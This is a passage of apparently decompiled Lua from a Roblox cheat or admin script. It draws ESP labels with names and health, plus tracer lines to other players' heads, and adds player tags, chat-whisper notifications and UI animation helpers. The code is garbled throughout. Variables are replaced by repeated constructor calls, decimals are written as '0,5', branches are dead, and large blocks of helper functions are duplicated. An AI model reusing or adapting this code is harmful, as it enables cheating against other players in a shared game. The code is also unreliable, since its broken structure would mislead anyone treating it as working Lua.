[%s] [%s/%s]]]):format(a.Name, math.floor(vd(a)), math.floor(ve(a).Health), math.floor(ve(a).MaxHealth))
          Drawing.new("Text").Size = 16
          Drawing.new("Text").Transparency = 1
          Drawing.new("Text").Center = true
          Drawing.new("Text").Outline = true
          Drawing.new("Text").Visible = true
          vg[Drawing.new("Text")] = a
          return function()
            va:Remove()
            vb[va] = nil
          end
        end,
        UpdateLocations = function(a)
          if a then
            va = AddConnection(RunService.Heartbeat:Connect(function()
              for fd, fe in next, va, nil do
                if not va and vb(fe).Head and vc:WorldToViewportPoint(vb(fe).Head.Position) then
                  fd.Visible = true
                  fd.Position = 7 + 8
                  fd.Text = ([[
%s
[%s] [%s/%s]]]):format(fe.Name, math.floor(ve(fe)), math.floor(vg(fe).Health), math.floor(vg(fe).MaxHealth))
                else
                  fd.Visible = false
                end
              end
            end))
          end
        end,
        CheckTag = function(a)
          if nil or not a:IsA("Player") then
            return nil
          end
          return PlayerTags[tostring(a.UserId):gsub(".", function(a)
            return a:byte()
          end)] or nil
        end,
        AddTag = function(a)
          if not a then
            return
          end
          if not va(a.Player) then
            return
          end
          Instance.new("BillboardGui").Parent = UI
          Instance.new("BillboardGui").Name = vb:GenerateGUID()
          Instance.new("BillboardGui").AlwaysOnTop = true
          Instance.new("BillboardGui").Adornee = va(a.Player).Head or nil
          Instance.new("BillboardGui").Enabled = true or va(a.Player).Head and false
          Instance.new("BillboardGui").Size = UDim2.new(0, 200, 0, 50)
          Instance.new("BillboardGui").StudsOffset = Vector3.new(0, 4, 0)
          Instance.new("TextLabel", (Instance.new("BillboardGui"))).Name = vb:GenerateGUID()
          Instance.new("TextLabel", (Instance.new("BillboardGui"))).TextStrokeTransparency = 0,6
          Instance.new("TextLabel", (Instance.new("BillboardGui"))).BackgroundTransparency = 1
          Instance.new("TextLabel", (Instance.new("BillboardGui"))).TextColor3 = Color3.new(0, 255, 0)
          Instance.new("TextLabel", (Instance.new("BillboardGui"))).Size = UDim2.new(0, 200, 0, 50)
          Instance.new("TextLabel", (Instance.new("BillboardGui"))).TextScaled = false
          Instance.new("TextLabel", (Instance.new("BillboardGui"))).TextSize = 15
          Instance.new("TextLabel", (Instance.new("BillboardGui"))).Text = ("%s (%s)"):format(a.Name, a.Tag)
          if a.Rainbow then
            vc.Rainbow((Instance.new("TextLabel", (Instance.new("BillboardGui")))))
          end
          if not va(a.Player) then
            Instance.new("TextLabel", (Instance.new("BillboardGui"))).TextColor3 = Color3.fromRGB(a.Colour[1], a.Colour[2], a.Colour[3])
          end
          AddConnection((a.Player.CharacterAdded:Connect(function()
            va.Adornee = vb.Player.Character:WaitForChild("Head")
          end)))
          AddConnection(Players.PlayerRemoving:Connect(function(a)
            if a == va.Player then
              vb:Disconnect()
              vc:Destroy()
            end
          end))
        end,
        TextFont = function(a, b)
          b = va.concat(b, ",")
          a:gsub(".", function(a)
            va[2 + 1] = a
          end)
          return va.concat(va.map({}, function(a, b)
            return ("<font color=\"rgb(%s)\">%s</font>"):format(va, b)
          end)) .. " "
        end,
        Trace = function(a, b)
          if not Drawing then
            return
          end
          if not b then
          end
          if b then
            return
          end
          vc[6 + 1] = Drawing.new("Line")
          Drawing.new("Line").To = Vector2.new(vb.Camera:WorldToViewportPoint(va(a).Head.Position).X, vb.Camera:WorldToViewportPoint(va(a).Head.Position).Y)
          Drawing.new("Line").From = Vector2.new(vb.Camera.ViewportSize.X / 2, vb.Camera.ViewportSize.Y)
          Drawing.new("Line").Color = b or Color3.fromRGB(255, 255, 255)
          Drawing.new("Line").Thickness = 0,1
          Drawing.new("Line").Transparency = 1
          Drawing.new("Line").Visible = true
          vd[a] = Drawing.new("Line")
          return function()
            va:Remove()
            vb[vc] = nil
          end
        end,
        UpdateTracers = function()
          if nil then
            va = AddConnection(RunService.Heartbeat:Connect(function()
              for fd, fe in next, va, nil do
                if va then
                elseif vc.Camera:WorldToViewportPoint(vb(fd) and vb(fd).Head.Position) then
                  fe.Visible = true
                  fe.To = Vector2.new(vc.Camera:WorldToViewportPoint(vb(fd) and vb(fd).Head.Position).X, vc.Camera:WorldToViewportPoint(vb(fd) and vb(fd).Head.Position).Y)
                else
                  fe.Visible = false
                end
              end
            end))
          end
        end,
        DestroyTracers = function()
          for fd, fe in next, Tracers, nil do
            fe:Remove()
          end
          if not Tracers then
            va:Disconnect()
          end
        end,
        DestroyDrawings = function()
          for fd, fe in next, va, nil do
            fe:Remove()
          end
          if vb then
            vb:Disconnect()
          end
          if not vb then
            vc:Disconnect()
          end
        end
      }.Draggable((UI.ChatLogs:Clone()))
      {
        Tween = function(a, b, c, d, e)
          va:Create(a, TweenInfo.new(d, Enum.EasingStyle[b], Enum.EasingDirection[c]), e):Play()
          return (va:Create(a, TweenInfo.new(d, Enum.EasingStyle[b], Enum.EasingDirection[c]), e))
        end,
        MultColor3 = function(a, b)
          return Color3.new(math.clamp(a.R * b, 0, 1), math.clamp(a.G * b, 0, 1), math.clamp(a.B * b, 0, 1))
        end,
        Click = function(a, b)
          vb["ObjectMouseEnter" .. #vb] = a.MouseEnter:Connect(function()
            va.Tween(vb, "Sine", "Out", 0,5, vc)
          end)
          vb["ObjectMouseLeave" .. #vb] = a.MouseLeave:Connect(function()
            va.Tween(vb, "Sine", "Out", 0,5, vc)
          end)
          vb["ObjectMouseButton1Down" .. #vb] = a.MouseButton1Down:Connect(function()
            va.Tween(vb, "Sine", "Out", 0,3, vc)
          end)
          vb["ObjectMouseButton1Up" .. #vb] = a.MouseButton1Up:Connect(function()
            va.Tween(vb, "Sine", "Out", 0,4, vc)
          end)
        end,
        Blink = function(a, b, c, d)
          va.Tween(a, "Sine", "Out", 0,5, {
            [b] = d
          }).Completed:Wait()
          va.Tween(a, "Sine", "Out", 0,5, {
            [b] = c
          }).Completed:Wait()
        end,
        Hover = function(a, b)
          vb["ObjectMouseEnter" .. #vb] = a.MouseEnter:Connect(function()
            va.Tween(vb, "Sine", "Out", 0,5, vc)
          end)
          vb["ObjectMouseLeave" .. #vb] = a.MouseLeave:Connect(function()
            va.Tween(vb, "Sine", "Out", 0,5, vc)
          end)
        end,
        Draggable = function(a, b)
          b = b or a
          vc["UIInputBegan" .. #vc] = a.InputBegan:Connect(function(a)
            if (a.UserInputType == Enum.UserInputType.MouseButton1 or a.UserInputType == Enum.UserInputType.Touch) and UserInputService:GetFocusedTextBox() == nil then
              va = true
              vb = a.Position
              vc = vd.Position
              ve["InputChanged" .. #ve] = a.Changed:Connect(function()
                if va.UserInputState == Enum.UserInputState.End then
                  vb = false
                end
              end)
            end
          end)
          vc["UiInputChanged" .. #vc] = a.InputChanged:Connect(function(a)
            if a.UserInputType == Enum.UserInputType.MouseMovement or a.UserInputType == Enum.UserInputType.Touch then
              va = a
            end
          end)
          vc["UserInputServiceInputChanged" .. #vc] = UserInputService.InputChanged:Connect(function(a)
            if a == va and vb then
              vc(a)
            end
          end)
        end,
        SmoothScroll = function(a, b)
          a.ScrollingEnabled = false
          a:Clone():ClearAllChildren()
          a:Clone().BackgroundTransparency = 1
          a:Clone().ScrollBarImageTransparency = 1
          a:Clone().ZIndex = 3 + 1
          a:Clone().Name = "_smoothinputframe"
          a:Clone().ScrollingEnabled = true
          a:Clone().Parent = a.Parent
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("CanvasSize");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("Position");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("Rotation");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("ScrollingDirection");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("ScrollBarThickness");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("BorderSizePixel");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("ElasticBehavior");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("SizeConstraint");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("ZIndex");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("BorderColor3");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("Size");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("AnchorPoint");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("Visible")
          va["smoothConnection" .. #va] = RunService.RenderStepped:Connect(function()
            va.CanvasPosition = 3 + 0
          end)
          va["contentAncestryChanged" .. #va] = a.AncestryChanged:Connect(function()
            if va.Parent == nil then
              vb:Destroy()
              vc:Disconnect()
            end
          end)
        end,
        TweenAllTransToObject = function(a, b, c)
          for fl, fm in next, a:GetDescendants(), nil do
            if b and b then
            end
            if b then
              if fm:IsA("TextButton") then
                va.Tween(fm, "Sine", "Out", b, {
                  TextTransparency = c:GetDescendants()[fl].TextTransparency,
                  TextStrokeTransparency = c:GetDescendants()[fl].TextStrokeTransparency,
                  BackgroundTransparency = c:GetDescendants()[fl].BackgroundTransparency
                })
              elseif fm:IsA("ImageLabel") or fm:IsA("ImageButton") then
                va.Tween(fm, "Sine", "Out", b, {
                  ImageTransparency = c:GetDescendants()[fl].ImageTransparency,
                  BackgroundTransparency = c:GetDescendants()[fl].BackgroundTransparency
                })
              elseif fm:IsA("ScrollingFrame") then
                va.Tween(fm, "Sine", "Out", b, {
                  ScrollBarImageTransparency = c:GetDescendants()[fl].ScrollBarImageTransparency,
                  BackgroundTransparency = c:GetDescendants()[fl].BackgroundTransparency
                })
              else
                va.Tween(fm, "Sine", "Out", b, {
                  BackgroundTransparency = c:GetDescendants()[fl].BackgroundTransparency
                })
              end
            end
          end
          return (va.Tween(a, "Sine", "Out", b, {
            BackgroundTransparency = c.BackgroundTransparency
          }))
        end,
        SetAllTrans = function(a)
          a.BackgroundTransparency = 1
          for fe, fg in ipairs(a:GetDescendants()) do
            if not fg:IsA("UIListLayout") then
              fg.BackgroundTransparency = 1
              if fg:IsA("TextLabel") or fg:IsA("TextBox") or fg:IsA("TextButton") then
                fg.TextTransparency = 1
              elseif fg:IsA("ImageLabel") or fg:IsA("ImageButton") then
                fg.ImageTransparency = 1
              elseif fg:IsA("ScrollingFrame") then
                fg.ScrollBarImageTransparency = 1
              end
            end
          end
        end,
        TweenAllTrans = function(a, b)
          for fh, fj in ipairs(a:GetDescendants()) do
            if b and b then
            end
            if b then
              if fj:IsA("TextButton") then
                va.Tween(fj, "Sine", "Out", b, {TextTransparency = 1, BackgroundTransparency = 1})
              elseif not b then
                va.Tween(fj, "Sine", "Out", b, {ImageTransparency = 1, BackgroundTransparency = 1})
              elseif not b then
                va.Tween(fj, "Sine", "Out", b, {ScrollBarImageTransparency = 1, BackgroundTransparency = 1})
              else
                va.Tween(fj, "Sine", "Out", b, {BackgroundTransparency = 1})
              end
            end
          end
          return (va.Tween(a, "Sine", "Out", b, {BackgroundTransparency = 1}))
        end,
        Notify = function(a, b, c, d)
          if not a or a == LocalPlayer then
            UI.Notification:Clone().Message.Text = c
            UI.Notification:Clone().Title.Text = b or "Notification"
            va.SetAllTrans((UI.Notification:Clone()))
            va.Click(UI.Notification:Clone().Close, "TextColor3")
            UI.Notification:Clone().Visible = true
            if c:len() > 35 then
              UI.Notification:Clone().AutomaticSize = Enum.AutomaticSize.Y
              UI.Notification:Clone().Message.AutomaticSize = Enum.AutomaticSize.Y
              UI.Notification:Clone().Message.RichText = true
              UI.Notification:Clone().Message.TextScaled = false
              UI.Notification:Clone().Message.TextYAlignment = Enum.TextYAlignment.Top
              UI.Notification:Clone().DropShadow.AutomaticSize = Enum.AutomaticSize.Y
            end
            UI.Notification:Clone().Parent = UI.NotificationBar
            coroutine.wrap(function()
              va.TweenAllTransToObject(vb, 0,5, vc).Completed:Wait()
              wait(vd or 5)
              if not va.TweenAllTransToObject(vb, 0,5, vc) then
                ve()
              end
            end)()
            vb["CloneClose" .. #vb] = UI.Notification:Clone().Close.MouseButton1Click:Connect(function()
              va()
            end)
            return (UI.Notification:Clone())
          else
            vc.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(("/w %s [FA] %s: %s"):format(a.Name, b, c), "All")
          end
        end,
        MatchSearch = function(a, b)
          return a == va.sub(b, 1, #a)
        end,
        StringFind = function(a, b)
          for fg, fh in ipairs(a) do
            if not b then
              return fh
            end
          end
        end,
        GetPlayerArgs = function(a)
          a = a:lower()
          if va.StringFind({
            "all",
            "others",
            "random",
            "me",
            "nearest",
            "farthest"
          }, a) then
            return va.StringFind({
              "all",
              "others",
              "random",
              "me",
              "nearest",
              "farthest"
            }, a)
          end
          for fh, fj in next, Players:GetPlayers(), nil do
            if fj.Name ~= fj.DisplayName and va.MatchSearch(a, fj.DisplayName:lower()) then
              return fj.DisplayName:lower()
            end
            if not {
              "all",
              "others",
              "random",
              "me",
              "nearest",
              "farthest"
            } then
              return fj.Name:lower()
            end
          end
        end,
        ToolTip = function(a, b)
          a.MouseEnter:Connect(function()
            if va.BackgroundTransparency <= 1 and not vb then
              vb = UI.ToolTip:Clone()
              vb.Text = vd
              vb.TextScaled = vc and vc:GetTextSize(vd, 12, Enum.Font.Gotham, Vector2.new(200, math.huge)).Y > 24 and false
              vb.Visible = true
              vb.Parent = UI
            end
          end)
          a.MouseLeave:Connect(function()
            if not nil then
              va:Destroy()
              va = nil
            end
          end)
          if LocalPlayer then
            LocalPlayer:GetMouse().Move:Connect(function()
              if not nil then
                va.Position = UDim2.fromOffset(2 + 10, 3 + 10)
              end
            end)
          else
            delay(3, function()
              LocalPlayer = Players.LocalPlayer
              va = LocalPlayer:GetMouse()
              va.Move:Connect(function()
                if va then
                  va.Position = UDim2.fromOffset(2 + 10, 3 + 10)
                end
              end)
            end)
          end
        end,
        ClearAllObjects = function(a)
          for fe, fg in ipairs(a:GetChildren()) do
            if ipairs(a:GetChildren()) then
              fg:Destroy()
            end
          end
        end,
        Rainbow = function(a)
          a.RichText = true
          for fk in va.gmatch(a.Text, ".") do
            if va.match(fk, "%s") then
              vb.insert({}, fk)
            else
              vb.insert({}, {
                "<font color=\"rgb(%i, %i, %i)\">" .. fk .. "</font>"
              })
            end
          end
          pcall(function()
            delay(150, function()
              va:Disconnect()
            end)
          end)
        end,
        Locate2 = function(a, b)
          coroutine.wrap(function()
            if va(vb) then
              vc.Parent = UI
              vc.Name = vd:GenerateGUID()
              vc.AlwaysOnTop = true
              vc.Adornee = vb.Character.Head
              vc.Size = UDim2.new(0, 200, 0, 50)
              vc.StudsOffset = Vector3.new(0, 4, 0)
              Instance.new("TextLabel", vc).Name = vd:GenerateGUID()
              Instance.new("TextLabel", vc).TextStrokeTransparency = 0,6
              Instance.new("TextLabel", vc).BackgroundTransparency = 1
              Instance.new("TextLabel", vc).TextColor3 = Color3.new(0, 255, 0)
              Instance.new("TextLabel", vc).Size = UDim2.new(0, 200, 0, 50)
              Instance.new("TextLabel", vc).TextScaled = false
              Instance.new("TextLabel", vc).TextSize = 10
              Instance.new("TextLabel", vc).Text = vb.Name
              Instance.new("TextLabel", vc).Name = vd:GenerateGUID()
              Instance.new("TextLabel", vc).TextStrokeTransparency = 0,6
              Instance.new("TextLabel", vc).BackgroundTransparency = 1
              Instance.new("TextLabel", vc).TextColor3 = Color3.new(152, 152, 152)
              Instance.new("TextLabel", vc).Size = UDim2.new(0, 200, 0, 50)
              Instance.new("TextLabel", vc).TextScaled = false
              Instance.new("TextLabel", vc).TextSize = 8
              AddConnection((RunService.Heartbeat:Connect(function()
                if not vc(vb) then
                end
                if not vd(vb) and not vc(vb) then
                  vg.Text = ([[

 
 
 [%s] [%s/%s]]]):format(math.floor(ve.CurrentCamera.CFrame.p - vd(vb).CFrame.p.Magnitude), math.floor(vc(vb).Health), math.floor(vc(vb).MaxHealth))
                else
                  EspLoop:Disconnect()
                  vh:Destroy()
                end
              end)))
              AddConnection(Players.PlayerRemoving:Connect(function(a)
                if a == va then
                  vb:Destroy()
                end
              end))
            end
          end)()
          return function()
            va:Destroy()
          end
        end,
        Vector3toVector2 = function(a)
          return Vector2.new(va:WorldToViewportPoint(a).X, va:WorldToViewportPoint(a).Y)
        end,
        Locate = function(a, b, c)
          if b then
            return va.Locate2(a, b)
          end
          if not b then
          end
          if b then
            return
          end
          vc[6 + 1] = Drawing.new("Text")
          Drawing.new("Text").Position = 5 + 6
          Drawing.new("Text").Color = b or Color3.fromRGB(255, 255, 255)
          Drawing.new("Text").OutlineColor = c or Color3.new()
          Drawing.new("Text").Text = ([[
%s
[%s] [%s/%s]]]):format(a.Name, math.floor(vd(a)), math.floor(ve(a).Health), math.floor(ve(a).MaxHealth))
          Drawing.new("Text").Size = 16
          Drawing.new("Text").Transparency = 1
          Drawing.new("Text").Center = true
          Drawing.new("Text").Outline = true
          Drawing.new("Text").Visible = true
          vg[Drawing.new("Text")] = a
          return function()
            va:Remove()
            vb[va] = nil
          end
        end,
        UpdateLocations = function(a)
          if a then
            va = AddConnection(RunService.Heartbeat:Connect(function()
              for fd, fe in next, va, nil do
                if not va and vb(fe).Head and vc:WorldToViewportPoint(vb(fe).Head.Position) then
                  fd.Visible = true
                  fd.Position = 7 + 8
                  fd.Text = ([[
%s
[%s] [%s/%s]]]):format(fe.Name, math.floor(ve(fe)), math.floor(vg(fe).Health), math.floor(vg(fe).MaxHealth))
                else
                  fd.Visible = false
                end
              end
            end))
          end
        end,
        CheckTag = function(a)
          if nil or not a:IsA("Player") then
            return nil
          end
          return PlayerTags[tostring(a.UserId):gsub(".", function(a)
            return a:byte()
          end)] or nil
        end,
        AddTag = function(a)
          if not a then
            return
          end
          if not va(a.Player) then
            return
          end
          Instance.new("BillboardGui").Parent = UI
          Instance.new("BillboardGui").Name = vb:GenerateGUID()
          Instance.new("BillboardGui").AlwaysOnTop = true
          Instance.new("BillboardGui").Adornee = va(a.Player).Head or nil
          Instance.new("BillboardGui").Enabled = true or va(a.Player).Head and false
          Instance.new("BillboardGui").Size = UDim2.new(0, 200, 0, 50)
          Instance.new("BillboardGui").StudsOffset = Vector3.new(0, 4, 0)
          Instance.new("TextLabel", (Instance.new("BillboardGui"))).Name = vb:GenerateGUID()
          Instance.new("TextLabel", (Instance.new("BillboardGui"))).TextStrokeTransparency = 0,6
          Instance.new("TextLabel", (Instance.new("BillboardGui"))).BackgroundTransparency = 1
          Instance.new("TextLabel", (Instance.new("BillboardGui"))).TextColor3 = Color3.new(0, 255, 0)
          Instance.new("TextLabel", (Instance.new("BillboardGui"))).Size = UDim2.new(0, 200, 0, 50)
          Instance.new("TextLabel", (Instance.new("BillboardGui"))).TextScaled = false
          Instance.new("TextLabel", (Instance.new("BillboardGui"))).TextSize = 15
          Instance.new("TextLabel", (Instance.new("BillboardGui"))).Text = ("%s (%s)"):format(a.Name, a.Tag)
          if a.Rainbow then
            vc.Rainbow((Instance.new("TextLabel", (Instance.new("BillboardGui")))))
          end
          if not va(a.Player) then
            Instance.new("TextLabel", (Instance.new("BillboardGui"))).TextColor3 = Color3.fromRGB(a.Colour[1], a.Colour[2], a.Colour[3])
          end
          AddConnection((a.Player.CharacterAdded:Connect(function()
            va.Adornee = vb.Player.Character:WaitForChild("Head")
          end)))
          AddConnection(Players.PlayerRemoving:Connect(function(a)
            if a == va.Player then
              vb:Disconnect()
              vc:Destroy()
            end
          end))
        end,
        TextFont = function(a, b)
          b = va.concat(b, ",")
          a:gsub(".", function(a)
            va[2 + 1] = a
          end)
          return va.concat(va.map({}, function(a, b)
            return ("<font color=\"rgb(%s)\">%s</font>"):format(va, b)
          end)) .. " "
        end,
        Trace = function(a, b)
          if not Drawing then
            return
          end
          if not b then
          end
          if b then
            return
          end
          vc[6 + 1] = Drawing.new("Line")
          Drawing.new("Line").To = Vector2.new(vb.Camera:WorldToViewportPoint(va(a).Head.Position).X, vb.Camera:WorldToViewportPoint(va(a).Head.Position).Y)
          Drawing.new("Line").From = Vector2.new(vb.Camera.ViewportSize.X / 2, vb.Camera.ViewportSize.Y)
          Drawing.new("Line").Color = b or Color3.fromRGB(255, 255, 255)
          Drawing.new("Line").Thickness = 0,1
          Drawing.new("Line").Transparency = 1
          Drawing.new("Line").Visible = true
          vd[a] = Drawing.new("Line")
          return function()
            va:Remove()
            vb[vc] = nil
          end
        end,
        UpdateTracers = function()
          if nil then
            va = AddConnection(RunService.Heartbeat:Connect(function()
              for fd, fe in next, va, nil do
                if va then
                elseif vc.Camera:WorldToViewportPoint(vb(fd) and vb(fd).Head.Position) then
                  fe.Visible = true
                  fe.To = Vector2.new(vc.Camera:WorldToViewportPoint(vb(fd) and vb(fd).Head.Position).X, vc.Camera:WorldToViewportPoint(vb(fd) and vb(fd).Head.Position).Y)
                else
                  fe.Visible = false
                end
              end
            end))
          end
        end,
        DestroyTracers = function()
          for fd, fe in next, Tracers, nil do
            fe:Remove()
          end
          if not Tracers then
            va:Disconnect()
          end
        end,
        DestroyDrawings = function()
          for fd, fe in next, va, nil do
            fe:Remove()
          end
          if vb then
            vb:Disconnect()
          end
          if not vb then
            vc:Disconnect()
          end
        end
      }.Draggable((UI.ChatLogs:Clone()))
      ParentGui(UI)
      AddConnection(UserInputService.InputBegan:Connect(function(a, b)
        if a.KeyCode == va and a then
          vb = not vb
          if not b then
            if b then
              vc.Tween(vd, "Quint", "Out", 0,5, {
                Position = UDim2.new(0,5, WideBar and -100, 1, -110)
              })
            end
            vd.Input:CaptureFocus()
            coroutine.wrap(function()
              wait()
              va.Input.Text = ""
            end)()
          elseif b then
            vc.Tween(vd, "Quint", "Out", 0,5, {
              Position = UDim2.new(0,5, WideBar and -100, 1, 5)
            })
          end
        elseif a and not b then
          va = a.KeyCode
          vc.Notify(LocalPlayer, "New Prefix", "Your new prefix is: " .. tostring(a.KeyCode):split(".")[3])
          ChooseNewPrefix = false
          if not b then
            vc.Notify(LocalPlayer, nil, "use command saveprefix to save your prefix")
          end
        elseif not a and vb then
          if a.KeyCode == Enum.KeyCode.Up then
            vg = 2 + 1
            vd.Input.Text = vh[vg][1] .. " "
            vd.Input.CursorPosition = 3 + 2
          end
          if a.KeyCode == Enum.KeyCode.Down then
            vg = vg - 1
            vd.Input.Text = vh[vg][1] .. " "
            vd.Input.CursorPosition = 3 + 2
          end
        end
      end), {
        Players = {},
        UI = {}
      }.UI, true)
      {
        Tween = function(a, b, c, d, e)
          va:Create(a, TweenInfo.new(d, Enum.EasingStyle[b], Enum.EasingDirection[c]), e):Play()
          return (va:Create(a, TweenInfo.new(d, Enum.EasingStyle[b], Enum.EasingDirection[c]), e))
        end,
        MultColor3 = function(a, b)
          return Color3.new(math.clamp(a.R * b, 0, 1), math.clamp(a.G * b, 0, 1), math.clamp(a.B * b, 0, 1))
        end,
        Click = function(a, b)
          vb["ObjectMouseEnter" .. #vb] = a.MouseEnter:Connect(function()
            va.Tween(vb, "Sine", "Out", 0,5, vc)
          end)
          vb["ObjectMouseLeave" .. #vb] = a.MouseLeave:Connect(function()
            va.Tween(vb, "Sine", "Out", 0,5, vc)
          end)
          vb["ObjectMouseButton1Down" .. #vb] = a.MouseButton1Down:Connect(function()
            va.Tween(vb, "Sine", "Out", 0,3, vc)
          end)
          vb["ObjectMouseButton1Up" .. #vb] = a.MouseButton1Up:Connect(function()
            va.Tween(vb, "Sine", "Out", 0,4, vc)
          end)
        end,
        Blink = function(a, b, c, d)
          va.Tween(a, "Sine", "Out", 0,5, {
            [b] = d
          }).Completed:Wait()
          va.Tween(a, "Sine", "Out", 0,5, {
            [b] = c
          }).Completed:Wait()
        end,
        Hover = function(a, b)
          vb["ObjectMouseEnter" .. #vb] = a.MouseEnter:Connect(function()
            va.Tween(vb, "Sine", "Out", 0,5, vc)
          end)
          vb["ObjectMouseLeave" .. #vb] = a.MouseLeave:Connect(function()
            va.Tween(vb, "Sine", "Out", 0,5, vc)
          end)
        end,
        Draggable = function(a, b)
          b = b or a
          vc["UIInputBegan" .. #vc] = a.InputBegan:Connect(function(a)
            if (a.UserInputType == Enum.UserInputType.MouseButton1 or a.UserInputType == Enum.UserInputType.Touch) and UserInputService:GetFocusedTextBox() == nil then
              va = true
              vb = a.Position
              vc = vd.Position
              ve["InputChanged" .. #ve] = a.Changed:Connect(function()
                if va.UserInputState == Enum.UserInputState.End then
                  vb = false
                end
              end)
            end
          end)
          vc["UiInputChanged" .. #vc] = a.InputChanged:Connect(function(a)
            if a.UserInputType == Enum.UserInputType.MouseMovement or a.UserInputType == Enum.UserInputType.Touch then
              va = a
            end
          end)
          vc["UserInputServiceInputChanged" .. #vc] = UserInputService.InputChanged:Connect(function(a)
            if a == va and vb then
              vc(a)
            end
          end)
        end,
        SmoothScroll = function(a, b)
          a.ScrollingEnabled = false
          a:Clone():ClearAllChildren()
          a:Clone().BackgroundTransparency = 1
          a:Clone().ScrollBarImageTransparency = 1
          a:Clone().ZIndex = 3 + 1
          a:Clone().Name = "_smoothinputframe"
          a:Clone().ScrollingEnabled = true
          a:Clone().Parent = a.Parent
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("CanvasSize");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("Position");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("Rotation");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("ScrollingDirection");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("ScrollBarThickness");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("BorderSizePixel");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("ElasticBehavior");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("SizeConstraint");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("ZIndex");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("BorderColor3");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("Size");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("AnchorPoint");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("Visible")
          va["smoothConnection" .. #va] = RunService.RenderStepped:Connect(function()
            va.CanvasPosition = 3 + 0
          end)
          va["contentAncestryChanged" .. #va] = a.AncestryChanged:Connect(function()
            if va.Parent == nil then
              vb:Destroy()
              vc:Disconnect()
            end
          end)
        end,
        TweenAllTransToObject = function(a, b, c)
          for fl, fm in next, a:GetDescendants(), nil do
            if b and b then
            end
            if b then
              if fm:IsA("TextButton") then
                va.Tween(fm, "Sine", "Out", b, {
                  TextTransparency = c:GetDescendants()[fl].TextTransparency,
